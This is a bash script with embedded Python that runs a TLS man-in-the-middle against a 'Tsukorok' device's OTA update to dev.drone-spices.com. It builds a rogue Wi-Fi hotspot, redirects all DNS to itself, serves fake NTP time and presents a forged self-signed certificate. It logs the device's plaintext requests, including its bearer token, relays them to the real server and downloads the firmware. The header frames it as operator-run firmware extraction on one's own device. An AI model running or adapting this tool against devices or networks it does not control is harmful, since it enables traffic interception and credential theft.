#!/usr/bin/env bash
###############################################################################
# tsukorok_mitm.sh  (v2) — operator-run TLS-intercept of the Tsukorok OTA
#
#   Presents a self-signed cert for dev.drone-spices.com to YOUR detector on
#   YOUR network. v2 handles the real OTA shape: a JSON POST with a bearer token
#   to /detector-server/activation/upgrade. It forwards the request faithfully,
#   captures the server's response, follows any firmware URL, saves firmware.bin,
#   and returns 304 to the device so NOTHING is flashed onto it.
#
# Requires: NetworkManager (nmcli), AP-capable Wi-Fi, openssl, python3, and a
# SECOND uplink (ethernet/tether) because the Wi-Fi becomes the AP.
#
#   sudo ./tsukorok_mitm.sh          # start (Ctrl-C to stop & clean up)
#   sudo ./tsukorok_mitm.sh stop     # force cleanup
###############################################################################
set -u
AP_SSID="drone_spices"; AP_PASS="87654321"; HOST="dev.drone-spices.com"
AP_IP="10.42.0.1"; WORK="/tmp/tsukorok_mitm"
DNSMASQ_DROPIN="/etc/NetworkManager/dnsmasq-shared.d/99-tsukorok-capture.conf"
DNS_LOG="/var/log/tsukorok-dns.log"; CONNAME="tsukorok-cap"

need_root(){ [ "$(id -u)" = "0" ] || { echo "Run with sudo."; exit 1; }; }
detect_wifi(){ nmcli -t -f DEVICE,TYPE device 2>/dev/null | awk -F: '$2=="wifi"{print $1; exit}'; }
cleanup(){
  echo; echo "[*] Cleaning up..."
  pkill -f "$WORK/ntp.py" 2>/dev/null; pkill -f "$WORK/mitm.py" 2>/dev/null
  rm -f "$DNSMASQ_DROPIN"
  nmcli connection down "$CONNAME" >/dev/null 2>&1; nmcli connection delete "$CONNAME" >/dev/null 2>&1
  if [ -n "${PREV_WIFI:-}" ] && [ "$PREV_WIFI" != "--" ]; then
    echo "[*] Reconnecting Wi-Fi to '$PREV_WIFI'..."; nmcli connection up "$PREV_WIFI" >/dev/null 2>&1; fi
  echo "[*] Done. Logs in $WORK (mitm.log, resp_upgrade.dat, firmware.bin if captured)."
}
do_stop(){
  pkill -f "$WORK/ntp.py" 2>/dev/null; pkill -f "$WORK/mitm.py" 2>/dev/null
  rm -f "$DNSMASQ_DROPIN"
  nmcli connection down "$CONNAME" >/dev/null 2>&1; nmcli connection delete "$CONNAME" >/dev/null 2>&1
  echo "[*] Stopped and cleaned up."; exit 0
}
need_root
[ "${1:-start}" = "stop" ] && do_stop
WIFI_IF="$(detect_wifi)"; [ -z "$WIFI_IF" ] && { echo "No Wi-Fi interface."; exit 1; }
mkdir -p "$WORK"; cd "$WORK"
echo "[*] Wi-Fi interface: $WIFI_IF"

echo "[*] Pinning real $HOST ..."
REAL_IP="$(getent ahostsv4 "$HOST" | awk '{print $1; exit}')"
[ -z "$REAL_IP" ] && REAL_IP="$(python3 -c "import socket;print(socket.gethostbyname('$HOST'))" 2>/dev/null)"
[ -z "$REAL_IP" ] && { echo "Cannot resolve $HOST."; exit 1; }
echo "$REAL_IP" > real_ip.txt; echo "    $HOST -> $REAL_IP"
curl -s -o /dev/null --max-time 10 "https://$HOST/" || \
  echo "!!! WARNING: cannot reach https://$HOST now — proxy needs a second uplink once Wi-Fi is the AP."

if [ ! -f mitm_cert.pem ]; then
  echo "[*] Generating self-signed cert for $HOST ..."
  openssl req -x509 -newkey rsa:2048 -keyout mitm_key.pem -out mitm_cert.pem \
    -days 3 -nodes -subj "/CN=$HOST" -addext "subjectAltName=DNS:$HOST" >/dev/null 2>&1
fi

cat > "$WORK/ntp.py" <<'PYEOF'
import socket, struct, time
E=2208988800
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); s.bind(("0.0.0.0",123))
print("ntp up",flush=True)
while True:
    d,a=s.recvfrom(512)
    if len(d)<48: continue
    now=time.time()+E; i=int(now); f=int((now-int(now))*(1<<32))
    p=struct.pack("!BBBb",(0<<6)|(4<<3)|4,1,4,-20)+struct.pack("!II",0,0)+b"LOCL"
    p+=struct.pack("!II",i,f)+d[40:48]+struct.pack("!II",i,f)+struct.pack("!II",i,f)
    s.sendto(p,a)
PYEOF

cat > "$WORK/mitm.py" <<'PYEOF'
import socket, ssl, threading, datetime, os, json, re, urllib.request
W=os.path.dirname(os.path.abspath(__file__))
HOST="dev.drone-spices.com"
RIP=open(os.path.join(W,"real_ip.txt")).read().strip()
CERT=os.path.join(W,"mitm_cert.pem"); KEY=os.path.join(W,"mitm_key.pem")
LOG=os.path.join(W,"mitm.log")
def log(m):
    line=f"{datetime.datetime.now():%H:%M:%S} {m}"
    print(line,flush=True); open(LOG,"a").write(line+"\n")
sctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
sctx.load_cert_chain(CERT,KEY); sctx.minimum_version=ssl.TLSVersion.TLSv1_2
def sni(sock,name,ctx):
    if name: log(f"[SNI] device asked cert for: {name}")
sctx.sni_callback=sni

def relay(method,path,headers,body):
    lines=[f"{method} {path} HTTP/1.1", f"Host: {HOST}"]
    for k,v in headers:
        if k.lower() in ("host","connection","accept-encoding"): continue
        lines.append(f"{k}: {v}")
    lines.append("Connection: close")
    raw=("\r\n".join(lines)+"\r\n\r\n").encode()+body
    ctx=ssl.create_default_context(); resp=b""
    with socket.create_connection((RIP,443),timeout=30) as s:
        with ctx.wrap_socket(s,server_hostname=HOST) as ss:
            ss.sendall(raw); ss.settimeout(30)
            try:
                while True:
                    b=ss.recv(65536)
                    if not b: break
                    resp+=b
            except socket.timeout: pass
    return resp

def fetch_url(url):
    try:
        req=urllib.request.Request(url, headers={"User-Agent":"esp-idf/1.0"})
        with urllib.request.urlopen(req, timeout=90) as r:
            return r.read()
    except Exception as e:
        log(f"[fw fetch error] {url}: {e}"); return b""

def split(r):
    i=r.find(b"\r\n\r\n")
    return (r[:i],r[i+4:]) if i>=0 else (r,b"")

def handle(c,a):
    try:
        tls=sctx.wrap_socket(c,server_side=True)
    except ssl.SSLError as e:
        log(f"[HANDSHAKE FAILED] {a[0]}:{a[1]} {e}")
        log("   => device REJECTED our cert -> it VALIDATES. MITM will not work.")
        try: c.close()
        except Exception: pass
        return
    except Exception:
        try: c.close()
        except Exception: pass
        return
    log(f"[HANDSHAKE OK] {a[0]}:{a[1]} => device ACCEPTED forged cert (does NOT validate!)")
    try:
        tls.settimeout(20); buf=b""
        while b"\r\n\r\n" not in buf:
            d=tls.recv(4096)
            if not d: break
            buf+=d
        headpart,_,rest=buf.partition(b"\r\n\r\n")
        L=headpart.decode("latin1","replace").split("\r\n")
        reqline=L[0] if L else ""
        log(f"[PLAINTEXT REQUEST] {reqline}")
        headers=[]
        for l in L[1:]:
            log(f"    {l}")
            if ":" in l:
                k,v=l.split(":",1); headers.append((k.strip(),v.strip()))
        cl=0
        for k,v in headers:
            if k.lower()=="content-length":
                try: cl=int(v)
                except Exception: cl=0
        body=rest
        while len(body)<cl:
            d=tls.recv(4096)
            if not d: break
            body+=d
        if body:
            log(f"[REQUEST BODY] {body[:1200].decode('latin1','replace')}")
        parts=reqline.split(); method=parts[0] if parts else "GET"; path=parts[1] if len(parts)>1 else "/"

        resp=relay(method,path,headers,body); rhead,rbody=split(resp)
        status=rhead.split("\r\n",1)[0] if rhead else "(none)"; ctype=""
        for hl in rhead.split("\r\n"):
            if hl.lower().startswith("content-type:"): ctype=hl.split(":",1)[1].strip()
        log(f"[REAL RESP] {status} type={ctype} body={len(rbody)} bytes")
        try: open(os.path.join(W,"resp_upgrade.dat"),"wb").write(rbody)
        except Exception: pass
        if rbody and len(rbody)<4000:
            log(f"[RESP BODY] {rbody.decode('latin1','replace')}")

        fw=b""
        if rbody[:1] in (b"{", b"["):
            try:
                j=json.loads(rbody.decode("utf-8","replace")); flat=json.dumps(j)
                log(f"[JSON] {flat[:1000]}")
                for u in re.findall(r'https?://[^\s\"\\]+', flat):
                    log(f"[JSON URL] {u}")
                    if u.lower().endswith(".bin") or any(w in u.lower() for w in ("firmware","upgrade","download","file","ota",".bin")):
                        log(f"[FETCHING FIRMWARE] {u}"); fw=fetch_url(u)
                        if fw: break
            except Exception as e:
                log(f"[json parse err] {e}")
        elif rbody[:1]==b"\xe9" or len(rbody)>20000 or "octet" in ctype:
            fw=rbody
        if fw:
            open(os.path.join(W,"firmware.bin"),"wb").write(fw)
            magic="ESP image (0xE9)" if fw[:1]==b"\xe9" else "NOT an ESP image"
            log(f"[SAVED] firmware.bin  {len(fw)} bytes  magic={magic}")

        tls.sendall(b"HTTP/1.1 304 Not Modified\r\nConnection: close\r\nContent-Length: 0\r\n\r\n")
    except Exception as e:
        log(f"[handle error] {a}: {e}")
    finally:
        try: tls.close()
        except Exception: pass

srv=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1); srv.bind(("0.0.0.0",443)); srv.listen(32)
log(f"[START] MITM proxy on :443 real={HOST}@{RIP}")
while True:
    cc,aa=srv.accept()
    threading.Thread(target=handle,args=(cc,aa),daemon=True).start()
PYEOF

cat > "$WORK/drive.py" <<'PYEOF'
import os,sys,termios,select,time,glob
def openp(port):
    fd=os.open(port,os.O_RDWR|os.O_NOCTTY|os.O_NONBLOCK)
    a=termios.tcgetattr(fd)
    a[0]=0;a[1]=0;a[2]=(termios.CLOCAL|termios.CREAD|termios.CS8);a[3]=0
    a[4]=termios.B115200;a[5]=termios.B115200
    termios.tcsetattr(fd,termios.TCSANOW,a); return fd
def rd(fd,secs):
    out=b"";t=time.time()
    while time.time()-t<secs:
        r,_,_=select.select([fd],[],[],0.3)
        if r:
            try: out+=os.read(fd,4096)
            except OSError: break
    return out
def wr(fd,s): os.write(fd,s.encode()+b"\r\n")
ports=sorted(glob.glob('/dev/ttyACM*')+glob.glob('/dev/ttyUSB*'))
dev=None
for p in ports:
    try:
        fd=openp(p); wr(fd,"status"); r=rd(fd,1.5)
        if b"cukorok" in r or b"version" in r: dev=(p,fd); break
        os.close(fd)
    except Exception: pass
if not dev:
    print("[drive] No Tsukorok on USB. Trigger 'Update' from the device MENU (join drone_spices first)."); sys.exit(0)
p,fd=dev; print(f"[drive] device on {p}")
wr(fd,"wifi client connect drone_spices 87654321"); print(rd(fd,10).decode('latin1','replace').strip())
time.sleep(3); print("[drive] sending update ..."); wr(fd,"update")
print(rd(fd,35).decode('latin1','replace').strip())
wr(fd,"wifi client disconnect"); rd(fd,3); os.close(fd)
PYEOF

cat > "$DNSMASQ_DROPIN" <<EOF
log-queries
log-facility=$DNS_LOG
address=/#/$AP_IP
EOF
: > "$DNS_LOG"; chmod 0644 "$DNS_LOG" 2>/dev/null

PREV_WIFI="$(nmcli -t -f NAME,DEVICE,TYPE connection show --active | awk -F: -v d="$WIFI_IF" '$3=="802-11-wireless" && $2==d {print $1; exit}')"
[ -z "$PREV_WIFI" ] && PREV_WIFI="--"
echo "[*] (previous Wi-Fi: $PREV_WIFI)"
trap cleanup INT TERM EXIT

echo "[*] Starting AP '$AP_SSID' on $WIFI_IF ..."
nmcli device wifi hotspot ifname "$WIFI_IF" con-name "$CONNAME" ssid "$AP_SSID" password "$AP_PASS" band bg >/dev/null 2>&1
nmcli connection modify "$CONNAME" \
  802-11-wireless-security.key-mgmt wpa-psk 802-11-wireless-security.proto rsn \
  802-11-wireless-security.pairwise ccmp 802-11-wireless-security.group ccmp \
  802-11-wireless-security.pmf 1 802-11-wireless.band bg 802-11-wireless.channel 6 >/dev/null 2>&1
nmcli connection up "$CONNAME" >/dev/null 2>&1
chmod 0644 "$DNS_LOG" 2>/dev/null; sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1
sleep 2
echo "[*] AP address: $(ip -4 addr show "$WIFI_IF" | awk '/inet /{print $2}')"

setsid python3 "$WORK/ntp.py"  >"$WORK/ntp.out"  2>&1 </dev/null &
setsid python3 "$WORK/mitm.py" >"$WORK/mitm.out" 2>&1 </dev/null &
sleep 2
echo "[*] Listeners:"; ss -tlnp 2>/dev/null | grep ':443'; ss -ulnp 2>/dev/null | grep ':123'

echo; echo "==============================================================="
echo " Triggering update (USB auto, else use device menu)..."
echo "==============================================================="
python3 "$WORK/drive.py" || true

echo; echo "[*] Watching $WORK/mitm.log  (Ctrl-C to stop & clean up)"
echo "    Look for: [REQUEST BODY], [RESP BODY]/[JSON URL], [SAVED] firmware.bin"
echo "---------------------------------------------------------------"
touch "$WORK/mitm.log"; tail -n +1 -F "$WORK/mitm.log"
